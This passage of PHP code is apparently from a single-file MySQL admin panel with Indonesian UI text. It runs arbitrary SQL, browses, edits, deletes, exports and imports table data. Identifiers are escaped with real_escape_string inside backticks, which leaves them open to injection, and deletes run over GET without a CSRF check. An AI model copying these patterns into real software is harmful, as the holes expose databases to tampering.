  $cols=[]; $res=@$mysqli->query("DESCRIBE `{$mysqli->real_escape_string($table)}`");
  if($res){ while($r=$res->fetch_assoc()){ $cols[]=$r; } $res->free(); }
  return $cols;
}

/* Views */
if ($view === 'sql') {
  if ($action === 'runsql' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) echo "<div class='notice err'>Bad CSRF</div>";
    else {
      $sql = (string)($_POST['sql'] ?? '');
      if ($sql === '') echo "<div class='notice err'>SQL kosong</div>";
      else {
        $ok = @$mysqli->multi_query($sql);
        if (!$ok) echo "<div class='notice err'>Error: ".e($mysqli->error)."</div>";
        else {
          do {
            if ($res = $mysqli->store_result()) {
              echo "<div class='notice ok'>Result set</div><table><tr>";
              $fields = $res->fetch_fields(); foreach ($fields as $f) echo "<th>".e($f->name)."</th>";
              echo "</tr>";
              while($row=$res->fetch_assoc()){ echo "<tr>"; foreach($row as $v){ echo "<td>".e((string)$v)."</td>"; } echo "</tr>"; }
              echo "</table>"; $res->free();
            } else {
              if ($mysqli->errno) echo "<div class='notice err'>Error: ".e($mysqli->error)."</div>";
              else echo "<div class='notice ok'>OK · Affected rows: ".intval($mysqli->affected_rows)."</div>";
            }
          } while ($mysqli->more_results() && $mysqli->next_result());
        }
      }
    }
  }
  echo "<h3>SQL</h3>";
  echo "<form method='post' action='".e(curr_url(['a'=>'runsql']))."'>";
  echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
  echo "<textarea name='sql' class='editor' spellcheck='false' placeholder='SELECT * FROM `table` LIMIT 50;'></textarea>";
  echo "<div style='margin-top:8px'><button class='btn'>Run</button></div>";
  echo "</form>";
}
elseif ($view === 'structure' && $table!=='') {
  $cols = cols_info($mysqli,$table);
  echo "<h3>Structure: ".e($table)."</h3>";
  echo "<table><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr>";
  foreach ($cols as $c) {
    echo "<tr><td>".e($c['Field'])."</td><td>".e($c['Type'])."</td><td>".e($c['Null'])."</td><td>".e($c['Key'])."</td><td>".e($c['Default'])."</td><td>".e($c['Extra'])."</td></tr>";
  }
  echo "</table>";
  $r=@$mysqli->query("SHOW CREATE TABLE `{$mysqli->real_escape_string($table)}`"); 
  if($r){ $row=$r->fetch_assoc(); echo "<pre class='editor' style='height:auto'>".e($row['Create Table'] ?? '')."</pre>"; $r->free(); }
}
elseif ($view === 'browse' && $table!=='') {
  if ($action === 'delrow' && isset($_GET['pk'])) {
    $pkCols = pk_info($mysqli,$table);
    if ($pkCols) {
      $pkVals = json_decode(base64_decode((string)$_GET['pk']), true);
      if (is_array($pkVals)) {
        $conds=[]; foreach($pkCols as $c){ $v = $pkVals[$c] ?? null; $conds[]="`{$mysqli->real_escape_string($c)}`=".qstr((string)$v,$mysqli); }
        $sql = "DELETE FROM `{$mysqli->real_escape_string($table)}` WHERE ".implode(' AND ',$conds)." LIMIT 1";
        @$mysqli->query($sql);
      }
    }
    header('Location: '.curr_url(['a'=>null])); exit;
  }

  $order  = $_GET['order'] ?? '';
  $dir    = strtoupper($_GET['dir'] ?? 'ASC'); if (!in_array($dir,['ASC','DESC'])) $dir='ASC';
  $orderSql = ($order!=='') ? " ORDER BY `".$mysqli->real_escape_string($order)."` ".$dir." " : "";
  $off = ($page-1)*$per;
  $total = 0;
  $rc = @$mysqli->query("SELECT COUNT(*) c FROM `{$mysqli->real_escape_string($table)}`");
  if ($rc){ $r=$rc->fetch_assoc(); $total=(int)$r['c']; $rc->free(); }
  $res = @$mysqli->query("SELECT * FROM `{$mysqli->real_escape_string($table)}`".$orderSql." LIMIT {$off},{$per}");
  echo "<h3>Browse: ".e($table)." <span class='small'>(page ".intval($page).", per ".intval($per).", total ".intval($total).")</span></h3>";

  echo "<form method='get' style='display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:8px'>";
  foreach (['mode','table','view'] as $k) echo "<input type='hidden' name='".e($k)."' value='".e($_GET[$k]??'')."'>";
  echo "<label>Order <select name='order'><option value=''>-</option>";
  if ($res) { while($f=$res->fetch_field()){ $sel=($order===$f->name)?"selected":""; echo "<option $sel>".e($f->name)."</option>"; } $res->data_seek(0); }
  echo "</select></label>";
  echo "<select name='dir'><option ".($dir==='ASC'?'selected':'').">ASC</option><option ".($dir==='DESC'?'selected':'').">DESC</option></select>";
  echo "<label>Per <input type='text' name='per' value='".e((string)$per)."' style='width:60px'></label>";
  echo "<label>Page <input type='text' name='p' value='".e((string)$page)."' style='width:60px'></label>";
  echo "<button class='btn'>Go</button>";
  echo "</form>";

  if ($res) {
    $pkCols = pk_info($mysqli,$table);
    echo "<table><tr>";
    $fields = $res->fetch_fields();
    foreach ($fields as $f) {
      $u = curr_url(['order'=>$f->name,'dir'=>($order===$f->name && $dir==='ASC')?'DESC':'ASC','p'=>1]);
      echo "<th><a href='".e($u)."'>".e($f->name)."</a></th>";
    }
    echo "<th>Actions</th></tr>";
    while($row=$res->fetch_assoc()){
      echo "<tr>";
      foreach ($fields as $f) echo "<td>".e((string)$row[$f->name])."</td>";
      echo "<td>";
      if ($pkCols) {
        $pkVals = []; foreach($pkCols as $c){ $pkVals[$c] = $row[$c] ?? ''; }
        $token = base64_encode(json_encode($pkVals));
        $edit = curr_url(['view'=>'edit','pk'=>$token]);
        $dup  = curr_url(['view'=>'duplicate','pk'=>$token]);
        $del  = curr_url(['a'=>'delrow','pk'=>$token]);
        echo "<a class='btn' href='".e($edit)."'>Edit</a> ";
        echo "<a class='btn gray' href='".e($dup)."'>Duplicate</a> ";
        echo "<a class='btn warn' href='".e($del)."' onclick=\"return confirm('Hapus baris ini?')\">Delete</a>";
      } else {
        echo "<span class='small'>No PK (edit/delete disabled)</span>";
      }
      echo "</td></tr>";
    }
    echo "</table>";
    $res->free();
  } else {
    echo "<div class='notice err'>".e($mysqli->error)."</div>";
  }
}
elseif (in_array($view, ['insert','edit','duplicate']) && $table!=='') {
  $cols = cols_info($mysqli,$table);
  $pkCols = pk_info($mysqli,$table);
  $values = array_fill_keys(array_map(fn($c)=>$c['Field'],$cols), '');

  if ($view!=='insert') {
    $pkVals = json_decode(base64_decode((string)($_GET['pk'] ?? '')), true);
    if (!$pkCols || !is_array($pkVals)) {
      echo "<div class='notice err'>No primary key or invalid PK.</div>";
      echo "</div></div></div></body></html>"; exit;
    }
    $conds=[]; foreach($pkCols as $c){ $v=$pkVals[$c]??''; $conds[]="`{$mysqli->real_escape_string($c)}`=".qstr((string)$v,$mysqli); }
    $sql="SELECT * FROM `{$mysqli->real_escape_string($table)}` WHERE ".implode(' AND ',$conds)." LIMIT 1";
    $res=@$mysqli->query($sql);
    if($res && $row=$res->fetch_assoc()){ foreach($row as $k=>$v){ if(array_key_exists($k,$values)) $values[$k]=$v; } }
    if($res) $res->free();
  }

  if ($action === 'rowsave' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) echo "<div class='notice err'>Bad CSRF</div>";
    else {
      $inp = [];
      foreach ($cols as $c) {
        $name = $c['Field'];
        $inp[$name] = isset($_POST['null__'.$name]) ? null : (string)($_POST['col__'.$name] ?? '');
      }
      if ($view==='insert' || $view==='duplicate') {
        $keys=[]; $vals=[];
        foreach ($inp as $k=>$v){ $keys[]="`{$mysqli->real_escape_string($k)}`"; $vals[]= is_null($v)? "NULL" : qstr($v,$mysqli); }
        $sql="INSERT INTO `{$mysqli->real_escape_string($table)}` (".implode(',',$keys).") VALUES (".implode(',',$vals).")";
        $ok=@$mysqli->query($sql);
        echo $ok ? "<div class='notice ok'>Inserted (ID: ".intval($mysqli->insert_id).")</div>" : "<div class='notice err'>".e($mysqli->error)."</div>";
      } elseif ($view==='edit') {
        if(!$pkCols){ echo "<div class='notice err'>No primary key</div>"; }
        else {
          $sets=[];
          foreach ($inp as $k=>$v){ $sets[]="`{$mysqli->real_escape_string($k)}`=".(is_null($v)?"NULL":qstr($v,$mysqli)); }
          $pkVals = json_decode(base64_decode((string)($_GET['pk'] ?? '')), true);
          $conds=[]; foreach($pkCols as $c){ $v=$pkVals[$c]??''; $conds[]="`{$mysqli->real_escape_string($c)}`=".qstr((string)$v,$mysqli); }
          $sql="UPDATE `{$mysqli->real_escape_string($table)}` SET ".implode(',',$sets)." WHERE ".implode(' AND ',$conds)." LIMIT 1";
          $ok=@$mysqli->query($sql);
          echo $ok ? "<div class='notice ok'>Updated (affected ".intval($mysqli->affected_rows).")</div>" : "<div class='notice err'>".e($mysqli->error)."</div>";
        }
      }
    }
  }

  echo "<h3>".($view==='insert'?'Insert':($view==='edit'?'Edit':'Duplicate')).": ".e($table)."</h3>";
  echo "<form method='post' action='".e(curr_url(['a'=>'rowsave']))."' style='display:grid;grid-template-columns:repeat(2,minmax(240px,1fr));gap:10px'>";
  echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
  foreach ($cols as $c) {
    $name=$c['Field']; $val=$values[$name]; $nullable=($c['Null']==='YES');
    echo "<label>".e($name)." <span class='small'>(".e($c['Type']).")</span><br>";
    echo "<input type='text' name='col__".e($name)."' value='".e((string)$val)."'>";
    if ($nullable) echo " <label class='small'><input type='checkbox' name='null__".e($name)."' ".(is_null($val)?'checked':'')."> NULL</label>";
    echo "</label>";
  }
  echo "<div style='grid-column:1/-1;display:flex;gap:8px'><button class='btn'>Save</button>";
  echo " <a class='btn gray' href='".e(curr_url(['view'=>'browse']))."'>Back</a></div>";
  echo "</form>";
}
elseif ($view === 'export' && $table!=='') {
  if (isset($_GET['download'])) {
    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename="'.basename($table).'-'.date('Ymd_His').'.csv"');
    $res=@$mysqli->query("SELECT * FROM `{$mysqli->real_escape_string($table)}`");
    if ($res) {
      $out = fopen('php://output','w');
      $fields=$res->fetch_fields(); $header=[]; foreach($fields as $f){ $header[]=$f->name; }
      fputcsv($out, $header);
      while($row=$res->fetch_assoc()){ fputcsv($out, array_values($row)); }
      fclose($out); $res->free();
    }
    exit;
  }
  echo "<h3>Export CSV: ".e($table)."</h3>";
  echo "<p><a class='btn' href='".e(curr_url(['download'=>1]))."' target='_blank'>Download CSV</a> <a class='btn gray' href='".e(curr_url(['view'=>'browse']))."'>Back</a></p>";
}
elseif ($view === 'import' && $table!=='') {
  if ($action === 'runimport' && $_SERVER['REQUEST_METHOD']==='POST') {
    if (!csrf_ok()) echo "<div class='notice err'>Bad CSRF</div>";
    else if (!empty($_FILES['sql']['tmp_name'])) {
      $sql = @file_get_contents($_FILES['sql']['tmp_name']);
      if ($sql===false || $sql==='') echo "<div class='notice err'>File kosong.</div>";
      else {
        $ok=@$mysqli->multi_query($sql);
        if(!$ok) echo "<div class='notice err'>".e($mysqli->error)."</div>";
        else { do { if ($r=$mysqli->store_result()) $r->free(); } while ($mysqli->more_results() && $mysqli->next_result()); echo "<div class='notice ok'>Import OK.</div>"; }
      }
    } else echo "<div class='notice err'>Pilih file .sql dulu.</div>";
  }
  echo "<h3>Import SQL into DB: ".e($db['db'])."</h3>";
  echo "<form method='post' enctype='multipart/form-data' action='".e(curr_url(['a'=>'runimport']))."'>";
  echo "<input type='hidden' name='csrf' value='".e($_SESSION['csrf'])."'>";
  echo "<input type='file' name='sql' accept='.sql'> ";
  echo "<button class='btn'>Import</button> ";
  echo "<a class='btn gray' href='".e(curr_url(['view'=>'browse']))."'>Back</a>";
  echo "</form>";
}
else {
  echo "<div class='notice'>Pilih tabel di kiri atau pakai tab <strong>SQL</strong> untuk menjalankan query.</div>";
}

echo "</div></div>"; // main panel wrap
echo "</body></html>";
